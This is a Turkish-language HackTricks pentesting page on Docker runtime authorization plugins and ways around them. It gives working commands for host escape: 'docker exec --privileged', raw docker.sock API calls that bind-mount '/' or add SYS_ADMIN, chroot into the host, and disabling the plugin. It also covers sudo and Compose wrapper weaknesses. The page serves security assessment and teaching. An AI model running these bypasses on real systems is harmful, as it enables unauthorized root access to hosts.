# Runtime Yetkilendirme Eklentileri

{{#include ../../../banners/hacktricks-training.md}}

## Genel Bakış

Runtime yetkilendirme eklentileri, bir istemcinin belirli bir daemon eylemini gerçekleştirip gerçekleştiremeyeceğine karar veren ek bir policy katmanıdır. Docker bunun klasik örneğidir. Varsayılan olarak, Docker daemon'uyla iletişim kurabilen herkes daemon üzerinde geniş denetime sahip olur. Yetkilendirme eklentileri, kimliği doğrulanmış kullanıcıyı ve istenen API işlemini inceleyerek, ardından policy'ye göre isteğe izin vererek veya isteği reddederek bu modeli daraltmaya çalışır.

Bu konuya ayrı bir sayfa ayırmak gerekir; çünkü saldırganın Docker API'sine veya `docker` grubundaki bir kullanıcıya zaten erişimi olduğunda exploitation modelini değiştirir. Bu tür ortamlarda artık tek soru "daemon'a erişebiliyor muyum?" değildir; "daemon bir yetkilendirme katmanıyla sınırlandırılmış mı ve öyleyse bu katman işlenmeyen endpoint'ler, zayıf JSON parsing veya plugin yönetimi izinleri üzerinden aşılabilir mi?" sorusu da önem kazanır.

## Çalışma Şekli

Bir istek Docker daemon'una ulaştığında, yetkilendirme alt sistemi istek bağlamını kurulu bir veya daha fazla eklentiye iletebilir. Eklenti; kimliği doğrulanmış kullanıcının kimliğini, istek ayrıntılarını, seçili header'ları ve içerik türü uygunsa istek veya yanıt gövdesinin bazı bölümlerini görür. Birden fazla eklenti zincirlenebilir ve erişim ancak tüm eklentiler isteğe izin verirse sağlanır.

Bu model kulağa güçlü gelse de güvenliği tamamen policy'yi yazan kişinin API'yi ne kadar kapsamlı anladığına bağlıdır. `docker run --privileged` komutunu engelleyen ancak `docker exec` komutunu göz ardı eden, üst düzey `Binds` gibi alternatif JSON anahtarlarını kaçıran veya plugin yönetimine izin veren bir eklenti, doğrudan privilege-escalation yollarını açık bırakırken kısıtlama olduğu yönünde yanlış bir güven hissi yaratabilir.

## Yaygın Plugin Hedefleri

Policy incelemesinde önemli alanlar şunlardır:

- container oluşturma endpoint'leri
- `Binds`, `Mounts`, `Privileged`, `CapAdd`, `PidMode` ve namespace paylaşım seçenekleri gibi `HostConfig` alanları
- `docker exec` davranışı
- plugin yönetimi endpoint'leri
- amaçlanan policy modelinin dışında runtime eylemlerini dolaylı olarak tetikleyebilecek tüm endpoint'ler

Geçmişte, Twistlock'un `authz` plugin'i ve `authobot` gibi basit eğitim amaçlı plugin'ler bu modeli incelemeyi kolaylaştırdı; çünkü policy dosyaları ve kod yolları, endpoint'lerin eylemlerle eşlemesinin gerçekte nasıl uygulandığını gösteriyordu. Assessment çalışmaları için önemli ders, policy yazarının yalnızca en görünür CLI komutlarını değil, tüm API yüzeyini anlaması gerektiğidir.

## Kötüye Kullanım

İlk amaç, gerçekte nelerin engellendiğini öğrenmektir. Daemon bir eylemi reddederse hata mesajı genellikle plugin adını leak eder; bu da kullanılan kontrolü belirlemeye yardımcı olur:

```bash
docker ps
docker run --rm -it --privileged ubuntu:24.04 bash
docker plugin ls
```

Daha kapsamlı endpoint profillemesi gerekiyorsa `docker_auth_profiler` gibi araçlar kullanışlıdır; çünkü eklenti tarafından hangi API rotalarına ve JSON yapılarına gerçekten izin verildiğini denetleme gibi normalde tekrarlayan bir işi otomatikleştirirler.

Ortamda özel bir eklenti kullanılıyorsa ve API ile etkileşim kurabiliyorsanız, hangi nesne alanlarının gerçekten filtrelendiğini listeleyin:

```bash
docker version
docker inspect <container> 2>/dev/null | head
curl --unix-socket /var/run/docker.sock http:/version
curl --unix-socket /var/run/docker.sock http:/v1.41/containers/json
```

Bu kontroller önemlidir çünkü birçok yetkilendirme hatası kavramdan ziyade belirli alanlarla ilgilidir. Bir plugin, eşdeğer API yapısını tamamen engellemeden bir CLI pattern'ini reddedebilir.

### Tam Örnek: `docker exec`, Container Oluşturulduktan Sonra Privilege Ekler

Privileged container oluşturmayı engelleyen ancak kısıtlanmamış container oluşturulmasına ve `docker exec` kullanımına izin veren bir policy yine de atlatılabilir:

```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu:24.04 sleep infinity
docker ps
docker exec -it --privileged <container_id> bash
```

Daemon ikinci adımı kabul ederse kullanıcı, politika yazarının kısıtlandığını düşündüğü bir container içinde ayrıcalıklı etkileşimli bir süreci ele geçirmiş olur.

Çağıran doğrudan Docker socket'ine erişemese bile kısıtlı bir `sudo` kuralı aynı yolu açabilir. Örneğin, root yetkisiyle `/usr/bin/docker exec *` çalıştırma izni, çağıranın Docker'ın `--privileged` ve `--user root` seçeneklerini vermesine olanak tanıyabilir. Yine de çalışan bir container gerekir; bazı Linux sunucularında `docker ps` komutu engellendiğinde container ID'si `containerd-shim` sürecinin komut satırında görülebilir. Bu kuralı bir inceleme ipucu olarak değerlendirin: etkin sudo politikasını, daemon'un yetkilendirme denetimlerini, user namespace'lerini ve sonuçta oluşan sürecin bir host cihazına ya da yazılabilir bir host mount'una erişip erişemediğini doğrulayın. Docker, `exec` seçeneklerini [CLI başvuru belgesinde](https://docs.docker.com/reference/cli/docker/container/exec/) açıklar.

Çağıranın seçtiği bir Compose dosyasını kabul eden, root olarak çalışan bir wrapper; yalnızca `privileged: true` değerini reddetmekle ve bind mount'lar için `:ro` şartı koymakla kalmamalı, [Compose service modelinin](https://docs.docker.com/reference/compose-file/services/) tamamını doğrulamalıdır. `cap_add`, `security_opt`, devices, namespace'ler, build girdileri ve desteklenen tüm volume sözdizimlerini inceleyin. Uygun capabilities ve gevşetilmiş güvenlik kısıtlamaları olan bir container içinden, salt okunur bind mount bile daemon ve kernel politikasına bağlı olarak yazılabilir hâle gelebilir. Yalnızca öneke dayalı host path izin listeleri ve son path bileşeninde yapılan symlink denetimleri de incelenmelidir. Bir sudo kuralı ve doğrudan `docker-compose up` çağrısı olası bir adayı gösterir; açığın kullanılabilir olup olmadığını wrapper'ın etkin doğrulaması ve çalışma zamanı daemon kısıtlamaları belirler.

### Tam Örnek: Raw API Üzerinden Bind Mount

Bazı bozuk politikalar yalnızca tek bir JSON biçimini inceler. Root filesystem bind mount'u tutarlı biçimde engellenmiyorsa host yine de mount edilebilir:

```bash
docker version
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","Binds":["/:/host"]}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> chroot /host /bin/bash
```

Aynı fikir `HostConfig` altında da görünebilir:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"Binds":["/:/host"]}}' \
  http:/v1.41/containers/create
```

Etki, host dosya sisteminden tamamen kaçıştır. İlginç ayrıntı, bypass'ın kernel hatasından değil, eksik policy kapsamından kaynaklanmasıdır.

### Tam Örnek: Denetlenmeyen Capability Özniteliği

Policy, capability ile ilgili bir özniteliği filtrelemeyi unutursa saldırgan, tehlikeli bir capability'yi yeniden kazanabilen bir container oluşturabilir:

```bash
curl --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Image":"ubuntu:24.04","HostConfig":{"CapAdd":["SYS_ADMIN"]}}' \
  http:/v1.41/containers/create
docker start <container_id>
docker exec -it <container_id> bash
capsh --print
```

`CAP_SYS_ADMIN` veya benzer güçte bir capability mevcut olduğunda, [capabilities.md](protections/capabilities.md) ve [privileged-containers.md](privileged-containers.md) dosyalarında açıklanan birçok breakout tekniği kullanılabilir hâle gelir.

### Tam Örnek: Plugin'i Devre Dışı Bırakma

Plugin yönetimi işlemlerine izin veriliyorsa, en temiz bypass kontrolü tamamen kapatmak olabilir:

```bash
docker plugin ls
docker plugin disable <plugin_name>
docker run --rm -it --privileged -v /:/host ubuntu:24.04 chroot /host /bin/bash
docker plugin enable <plugin_name>
```

Bu, control-plane düzeyinde bir politika hatasıdır. Yetkilendirme katmanı vardır, ancak kısıtlaması gereken kullanıcı bu katmanı devre dışı bırakma iznini hâlâ elinde tutar.

## Kontroller

Bu komutlar, bir politika katmanının bulunup bulunmadığını ve eksiksiz mi yoksa yüzeysel mi göründüğünü belirlemeyi amaçlar.

```bash
docker plugin ls
docker info 2>/dev/null | grep -i authorization
docker run --rm -it --privileged ubuntu:24.04 bash
curl --unix-socket /var/run/docker.sock http:/v1.41/plugins 2>/dev/null
```

Burada ilginç olanlar:

- Plugin adı içeren erişim reddi mesajları, bir yetkilendirme katmanının varlığını doğrular ve çoğu zaman kullanılan uygulamayı tam olarak ortaya çıkarır.
- Saldırganın görebildiği bir plugin listesi, devre dışı bırakma veya yeniden yapılandırma işlemlerinin mümkün olup olmadığını anlamak için yeterli olabilir.
- Yalnızca bariz CLI eylemlerini engelleyip ham API isteklerini engellemeyen bir politika, aksinin kanıtlanmasına kadar aşılabilir kabul edilmelidir.

## Çalışma Zamanı Varsayılanları

| Çalışma zamanı / platform | Varsayılan durum | Varsayılan davranış | Yaygın manuel zayıflatma |
| --- | --- | --- | --- |
| Docker Engine | Varsayılan olarak etkin değil | Bir authorization plugin yapılandırılmadıkça daemon erişimi fiilen ya tamamen açıktır ya da tamamen kapalıdır | eksik plugin politikası, allowlist yerine blacklist kullanılması, plugin yönetimine izin verilmesi, alan düzeyinde gözden kaçan noktalar |
| Podman | Yaygın bir doğrudan eşdeğeri yok | Podman genellikle Docker tarzı authz plugin'leri yerine Unix izinlerine, rootless çalıştırmaya ve API'nin açığa çıkarılmasına ilişkin tercihlere daha fazla dayanır | rootful Podman API'sinin geniş erişime açılması, zayıf socket izinleri |
| containerd / CRI-O | Farklı bir kontrol modeli | Bu çalışma zamanları genellikle Docker authz plugin'leri yerine socket izinlerine, node güven sınırlarına ve üst katmandaki orkestratör denetimlerine dayanır | socket'in workload'lara bağlanması, node üzerindeki güven varsayımlarının zayıf olması |
| Kubernetes | Docker authz plugin'leri yerine API server ve kubelet katmanlarında authn/authz kullanır | Cluster RBAC ve admission kontrolleri ana politika katmanıdır | aşırı geniş RBAC, zayıf admission politikası, kubelet veya runtime API'lerinin doğrudan açığa çıkarılması |

{{#include ../../../banners/hacktricks-training.md}}
